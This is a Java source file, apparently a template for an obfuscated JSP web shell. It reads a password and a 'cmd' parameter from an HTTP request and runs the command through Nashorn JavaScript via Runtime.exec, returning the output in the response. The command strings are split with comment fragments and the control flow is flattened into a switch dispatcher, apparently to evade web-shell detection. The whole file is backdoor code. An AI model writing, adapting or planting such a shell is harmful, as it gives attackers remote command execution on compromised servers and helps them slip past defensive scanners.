package org.sec.util;

/**
 * ScriptEngine调用JS
 */
public class JS {
    public static void main(String[] args) {
        String[] globalArr = new String[]{"0|1|2|3|4|5|6|7|8|9|10|11|12|13|14|15|16|17|18|19|20|21|22|23|24",
                "JavaScript", "request", "pwd", "function test(){", "try {\n", "  load(\"nashorn:mozilla_compat.js\");\n",
                "} catch (e) {}\n", "importPackage(Packages.java.lang);\n", "var cmd = request.getParameter(\"cmd\");",
                "var x=java/****/.lang./****/Run", "time./****", "/getRunti", "me()/****/.exec(cmd);",
                "return x.getInputStream();};", "test();", "<pre>", "</pre>"
        };
        String temp = globalArr[0];
        String[] b = temp.split("\\|");

        javax.script.ScriptEngine engine = null;
        String pwd = null;
        StringBuilder testSb = null;
        java.io.InputStream in = null;
        StringBuilder outStr = null;
        byte[] buffer = null;
        java.io.InputStreamReader resulutReader = null;
        java.io.BufferedReader stdInput = null;

        int id = 0;
        int index = 0;
        while (true) {
            int op = Integer.parseInt(b[index++]);
            switch (op) {
                case 0:
                    engine = new javax.script.ScriptEngineManager().getEngineByName(globalArr[1]);
                    break;
                case 1:
                    engine.put(globalArr[2], request);
                    break;
                case 2:
                    pwd = request.getParameter(globalArr[3]);
                    break;
                case 3:
                    if (!pwd.equals(PASSWORD)) {
                        return;
                    }
                    break;
                case 4:
                    testSb = new StringBuilder();
                    break;
                case 5:
                    testSb.append(globalArr[4]);
                    break;
                case 6:
                    testSb.append(globalArr[5]);
                    break;
                case 7:
                    testSb.append(globalArr[6]);
                    break;
                case 8:
                    testSb.append(globalArr[7]);
                    break;
                case 9:
                    testSb.append(globalArr[8]);
                    break;
                case 10:
                    testSb.append(globalArr[9]);
                    break;
                case 11:
                    testSb.append(globalArr[10]);
                    break;
                case 12:
                    testSb.append(globalArr[11]);
                    break;
                case 13:
                    testSb.append(globalArr[12]);
                    break;
                case 14:
                    testSb.append(globalArr[13]);
                    break;
                case 15:
                    testSb.append(globalArr[14]);
                    break;
                case 16:
                    testSb.append(globalArr[15]);
                    break;
                case 17:
                    in = (java.io.InputStream) engine.eval(testSb.toString());
                    break;
                case 18:
                    outStr = new StringBuilder();
                    break;
                case 19:
                    response.getWriter().print(globalArr[16]);
                    break;
                case 20:
                    resulutReader = new java.io.InputStreamReader(in);
                    break;
                case 21:
                    stdInput = new java.io.BufferedReader(resulutReader);
                    break;
                case 22:
                    String s = null;
                    while ((s = stdInput.readLine()) != null) {
                        outStr.append(s + "\n");
                    }
                    break;
                case 23:
                    response.getWriter().print(outStr.toString());
                    break;
                case 24:
                    response.getWriter().print(globalArr[17]);
                    break;
            }
        }
    }
}
